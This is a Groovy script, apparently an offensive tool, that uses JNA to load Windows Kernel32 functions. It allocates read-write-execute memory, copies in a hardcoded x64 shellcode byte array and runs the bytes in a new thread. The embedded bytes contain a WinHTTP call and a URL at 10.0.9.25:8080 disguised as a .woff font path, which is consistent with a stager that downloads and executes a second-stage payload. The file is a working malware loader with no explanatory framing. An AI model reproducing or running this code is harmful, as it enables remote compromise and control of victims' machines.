// Import required JNA classes for interacting with native Windows APIs
import com.sun.jna.Native             
import com.sun.jna.Library
import com.sun.jna.Pointer
import com.sun.jna.ptr.IntByReference

/*
 * Interface mapping to Windows Kernel32.dll using JNA
 * 
 * Provides access to low-level Windows API functions for:
 *  - Memory allocation (VirtualAlloc)
 *  - Thread creation (CreateThread)
 *  - Thread synchronization (WaitForSingleObject)
 */
interface Kernel32 extends Library {
	// Load Kernel32.dll dynamically using JNA
	Kernel32 INSTANCE = Native.load("Kernel32", Kernel32.class)
		
	/*
     * Reserves or commits memory in the virtual address space of the calling process
     *
     * @param lpAddress        Starting address of memory allocation
     * @param dwSize           Size of memory block to allocate
     * @param flAllocationType Type of memory allocation
     * @param flProtect        Memory protection flags
     * @return Pointer to the allocated memory.
     */
	Pointer VirtualAlloc(
	    Pointer lpAddress,
	    int dwSize,
	    int flAllocationType,
	    int flProtect
	)
			
	/*
     * Creates a new thread in the calling process
     *
     * @param lpThreadAttributes Security attributes
     * @param dwStackSize        Initial stack size
     * @param lpStartAddress     Pointer to the application-defined function to execute
     * @param lpParameter        Argument passed to the thread function
     * @param dwCreationFlags    Thread creation options
     * @param lpThreadId         Returns the thread ID
     * @return Handle to the new thread.
     */	
	Pointer CreateThread(
		Pointer lpThreadAttributes,
	    int dwStackSize,
	    Pointer lpStartAddress,
	    Pointer lpParameter,
	    int dwCreationFlags,
	    IntByReference lpThreadId
    )
	  
    /*
     * Waits until the specified object (thread handle) is in the signaled state
     * or the time-out interval elapses
     *
     * @param hHandle        Handle to the object (thread) to wait on
     * @param dwMilliseconds Time-out interval in milliseconds
     * @return Wait result code
     */
	int WaitForSingleObject(
	    Pointer hHandle,
	    int dwMilliseconds
	)
}

/*
 * Runner function:
 *  1. Allocates executable memory
 *  2. Copies shellcode (buf) into allocated memory
 *  3. Creates a thread to execute the shellcode
 *  4. Waits indefinitely for the thread to finish
 */
void Runner() {
	byte[] buf = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00,
        0x41, 0x51, 0x41, 0x50, 0x52, 0x48, 0x31, 0xd2, 0x51, 0x56,
        0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
        0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
        0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
        0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78,
        0x18, 0x0b, 0x02, 0x0f, 0x85, 0x72, 0x00, 0x00, 0x00, 0x8b,
        0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67,
        0x48, 0x01, 0xd0, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01,
        0xd0, 0x8b, 0x48, 0x18, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x4d, 0x31, 0xc9, 0x48, 0x01, 0xd6, 0x48,
        0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1,
        0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45,
        0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49,
        0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40,
        0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x41, 0x58,
        0x41, 0x58, 0x5e, 0x59, 0x48, 0x01, 0xd0, 0x5a, 0x41, 0x58,
        0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52,
        0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9,
        0x4b, 0xff, 0xff, 0xff, 0x5d, 0x48, 0x31, 0xdb, 0x53, 0x49,
        0xbe, 0x77, 0x69, 0x6e, 0x68, 0x74, 0x74, 0x70, 0x00, 0x41,
        0x56, 0x48, 0x89, 0xe1, 0x49, 0xc7, 0xc2, 0x4c, 0x77, 0x26,
        0x07, 0xff, 0xd5, 0x53, 0x53, 0x48, 0x89, 0xe1, 0x53, 0x5a,
        0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x53, 0x53, 0x49, 0xba,
        0x04, 0x1f, 0x9d, 0xbb, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5,
        0x49, 0x89, 0xc4, 0xe8, 0x14, 0x00, 0x00, 0x00, 0x31, 0x00,
        0x30, 0x00, 0x2e, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x39, 0x00,
        0x2e, 0x00, 0x32, 0x00, 0x35, 0x00, 0x00, 0x00, 0x5a, 0x48,
        0x89, 0xc1, 0x49, 0xc7, 0xc0, 0x90, 0x1f, 0x00, 0x00, 0x4d,
        0x31, 0xc9, 0x49, 0xba, 0x46, 0x9b, 0x1e, 0xc2, 0x00, 0x00,
        0x00, 0x00, 0xff, 0xd5, 0xe8, 0xce, 0x01, 0x00, 0x00, 0x68,
        0x00, 0x74, 0x00, 0x74, 0x00, 0x70, 0x00, 0x3a, 0x00, 0x2f,
        0x00, 0x2f, 0x00, 0x31, 0x00, 0x30, 0x00, 0x2e, 0x00, 0x30,
        0x00, 0x2e, 0x00, 0x39, 0x00, 0x2e, 0x00, 0x32, 0x00, 0x35,
        0x00, 0x3a, 0x00, 0x38, 0x00, 0x30, 0x00, 0x38, 0x00, 0x30,
        0x00, 0x2f, 0x00, 0x61, 0x00, 0x74, 0x00, 0x74, 0x00, 0x72,
        0x00, 0x69, 0x00, 0x62, 0x00, 0x75, 0x00, 0x74, 0x00, 0x65,
        0x00, 0x5f, 0x00, 0x74, 0x00, 0x65, 0x00, 0x78, 0x00, 0x74,
        0x00, 0x5f, 0x00, 0x77, 0x00, 0x30, 0x00, 0x31, 0x00, 0x5f,
        0x00, 0x72, 0x00, 0x65, 0x00, 0x67, 0x00, 0x75, 0x00, 0x6c,
        0x00, 0x61, 0x00, 0x72, 0x00, 0x2e, 0x00, 0x77, 0x00, 0x6f,
        0x00, 0x66, 0x00, 0x66, 0x00, 0x2f, 0x00, 0x72, 0x00, 0x49,
        0x00, 0x31, 0x00, 0x59, 0x00, 0x65, 0x00, 0x77, 0x00, 0x31,
        0x00, 0x48, 0x00, 0x59, 0x00, 0x4b, 0x00, 0x73, 0x00, 0x79,
        0x00, 0x70, 0x00, 0x44, 0x00, 0x4f, 0x00, 0x6d, 0x00, 0x57,
        0x00, 0x6e, 0x00, 0x6b, 0x00, 0x61, 0x00, 0x44, 0x00, 0x51,
        0x00, 0x48, 0x00, 0x30, 0x00, 0x48, 0x00, 0x6d, 0x00, 0x72,
        0x00, 0x36, 0x00, 0x4f, 0x00, 0x74, 0x00, 0x32, 0x00, 0x51,
        0x00, 0x53, 0x00, 0x6c, 0x00, 0x73, 0x00, 0x4e, 0x00, 0x34,
        0x00, 0x4c, 0x00, 0x57, 0x00, 0x34, 0x00, 0x64, 0x00, 0x72,
        0x00, 0x35, 0x00, 0x46, 0x00, 0x44, 0x00, 0x43, 0x00, 0x56,
        0x00, 0x63, 0x00, 0x6a, 0x00, 0x70, 0x00, 0x4a, 0x00, 0x62,
        0x00, 0x37, 0x00, 0x38, 0x00, 0x72, 0x00, 0x65, 0x00, 0x6d,
        0x00, 0x44, 0x00, 0x6d, 0x00, 0x55, 0x00, 0x57, 0x00, 0x39,
        0x00, 0x73, 0x00, 0x61, 0x00, 0x4a, 0x00, 0x33, 0x00, 0x30,
        0x00, 0x55, 0x00, 0x72, 0x00, 0x59, 0x00, 0x7a, 0x00, 0x6e,
        0x00, 0x4e, 0x00, 0x66, 0x00, 0x4a, 0x00, 0x4f, 0x00, 0x71,
        0x00, 0x42, 0x00, 0x44, 0x00, 0x6f, 0x00, 0x70, 0x00, 0x38,
        0x00, 0x77, 0x00, 0x64, 0x00, 0x4a, 0x00, 0x73, 0x00, 0x67,
        0x00, 0x2d, 0x00, 0x36, 0x00, 0x70, 0x00, 0x44, 0x00, 0x67,
        0x00, 0x79, 0x00, 0x47, 0x00, 0x52, 0x00, 0x46, 0x00, 0x6b,
        0x00, 0x6e, 0x00, 0x79, 0x00, 0x41, 0x00, 0x56, 0x00, 0x63,
        0x00, 0x56, 0x00, 0x5f, 0x00, 0x31, 0x00, 0x55, 0x00, 0x6c,
        0x00, 0x77, 0x00, 0x4e, 0x00, 0x65, 0x00, 0x49, 0x00, 0x6e,
        0x00, 0x4a, 0x00, 0x38, 0x00, 0x36, 0x00, 0x51, 0x00, 0x74,
        0x00, 0x63, 0x00, 0x31, 0x00, 0x43, 0x00, 0x48, 0x00, 0x45,
        0x00, 0x47, 0x00, 0x73, 0x00, 0x5a, 0x00, 0x6d, 0x00, 0x61,
        0x00, 0x42, 0x00, 0x6d, 0x00, 0x36, 0x00, 0x4c, 0x00, 0x63,
        0x00, 0x57, 0x00, 0x6d, 0x00, 0x62, 0x00, 0x4a, 0x00, 0x5a,
        0x00, 0x6b, 0x00, 0x59, 0x00, 0x69, 0x00, 0x45, 0x00, 0x4a,
        0x00, 0x6a, 0x00, 0x39, 0x00, 0x2d, 0x00, 0x6f, 0x00, 0x7a,
        0x00, 0x47, 0x00, 0x2d, 0x00, 0x5a, 0x00, 0x67, 0x00, 0x4a,
        0x00, 0x47, 0x00, 0x55, 0x00, 0x62, 0x00, 0x6b, 0x00, 0x32,
        0x00, 0x75, 0x00, 0x35, 0x00, 0x62, 0x00, 0x42, 0x00, 0x7a,
        0x00, 0x51, 0x00, 0x49, 0x00, 0x2d, 0x00, 0x5a, 0x00, 0x63,
        0x00, 0x70, 0x00, 0x4f, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x30,
        0x00, 0x5f, 0x00, 0x54, 0x00, 0x44, 0x00, 0x4a, 0x00, 0x00,
        0x00, 0x48, 0x89, 0xc1, 0x53, 0x5a, 0x41, 0x58, 0x4d, 0x89,
        0xc5, 0x49, 0x83, 0xc0, 0x2a, 0x4d, 0x31, 0xc9, 0x53, 0x48,
        0xc7, 0xc0, 0x00, 0x01, 0x00, 0x00, 0x50, 0x53, 0x53, 0x49,
        0xc7, 0xc2, 0x98, 0x10, 0xb3, 0x5b, 0xff, 0xd5, 0x48, 0x89,
        0xc6, 0x48, 0x83, 0xe8, 0x20, 0x48, 0x89, 0xe7, 0x48, 0x89,
        0xf9, 0x49, 0xc7, 0xc2, 0x21, 0xa7, 0x0b, 0x60, 0xff, 0xd5,
        0x85, 0xc0, 0x0f, 0x84, 0x6d, 0x00, 0x00, 0x00, 0x48, 0x8b,
        0x47, 0x08, 0x85, 0xc0, 0x74, 0x3a, 0x48, 0x89, 0xd9, 0x48,
        0xff, 0xc1, 0x48, 0xc1, 0xe1, 0x20, 0x51, 0x53, 0x50, 0x48,
        0xb8, 0x03, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x50,
        0x49, 0x89, 0xe0, 0x48, 0x83, 0xec, 0x20, 0x48, 0x89, 0xe7,
        0x49, 0x89, 0xf9, 0x4c, 0x89, 0xe1, 0x4c, 0x89, 0xea, 0x49,
        0xc7, 0xc2, 0xda, 0xdd, 0xea, 0x49, 0xff, 0xd5, 0x85, 0xc0,
        0x74, 0x2d, 0xeb, 0x12, 0x48, 0x8b, 0x47, 0x10, 0x85, 0xc0,
        0x74, 0x23, 0x48, 0x83, 0xc7, 0x08, 0x6a, 0x03, 0x58, 0x48,
        0x89, 0x07, 0x49, 0x89, 0xf8, 0x6a, 0x18, 0x41, 0x59, 0x48,
        0x89, 0xf1, 0x6a, 0x26, 0x5a, 0x49, 0xba, 0xd3, 0x58, 0x9d,
        0xce, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x5f,
        0x53, 0x5a, 0x48, 0x89, 0xf1, 0x4d, 0x31, 0xc9, 0x53, 0x53,
        0x53, 0x53, 0x49, 0xba, 0x95, 0x58, 0xbb, 0x91, 0x00, 0x00,
        0x00, 0x00, 0xff, 0xd5, 0x85, 0xc0, 0x75, 0x0c, 0x48, 0xff,
        0xcf, 0x74, 0x02, 0xeb, 0xdd, 0xe8, 0x79, 0x00, 0x00, 0x00,
        0x48, 0x89, 0xf1, 0x53, 0x5a, 0x49, 0xc7, 0xc2, 0x05, 0x88,
        0x9d, 0x70, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0xe9, 0x53, 0x48,
        0x89, 0xe2, 0x53, 0x49, 0x89, 0xe1, 0x6a, 0x04, 0x41, 0x58,
        0x48, 0x89, 0xf1, 0x49, 0xc7, 0xc2, 0x6c, 0x29, 0x24, 0x7e,
        0xff, 0xd5, 0x85, 0xc0, 0x74, 0xcd, 0x48, 0x83, 0xc4, 0x28,
        0x53, 0x59, 0x5a, 0x48, 0x89, 0xd3, 0x6a, 0x40, 0x41, 0x59,
        0x49, 0xc7, 0xc0, 0x00, 0x10, 0x00, 0x00, 0x49, 0xba, 0x58,
        0xa4, 0x53, 0xe5, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd5, 0x48,
        0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x49,
        0x89, 0xc0, 0x48, 0x89, 0xda, 0x49, 0x89, 0xf9, 0x49, 0xc7,
        0xc2, 0x6c, 0x29, 0x24, 0x7e, 0xff, 0xd5, 0x48, 0x83, 0xc4,
        0x20, 0x85, 0xc0, 0x0f, 0x84, 0x84, 0xff, 0xff, 0xff, 0x58,
        0xc3, 0x58, 0x6a, 0x00, 0x59, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a,
        0x41, 0x89, 0xda, 0xff, 0xd5
	]
		
	// Allocate RWX (read/write/execute) memory for shellcode
	Pointer lpAddress = Kernel32.INSTANCE.VirtualAlloc(
		null, 
		buf.length, 
		0x3000, // MEM_COMMIT
		0x40    // PAGE_EXECUTE_READWRITE
	)
 
	// Write shellcode (buf) into the allocated memory region
	lpAddress.write(
		0, 
		buf, 
		0, 
		buf.length
	)

    // Create a new thread that starts executing at the shellcode's memory location
    Pointer hThread = Kernel32.INSTANCE.CreateThread(
		null, 
		0, 
		lpAddress, 
		null, 
		0, 
		null
    )

    // Wait indefinitely for the shellcode thread to complete
    Kernel32.INSTANCE.WaitForSingleObject(
		hThread, 
		(int)0xFFFFFFFF
    )
}

// Create a Java thread to execute Runner() in parallel
Thread thread = new Thread(){
    public void run(){
        Runner();
    }
}

// Start the thread
thread.start();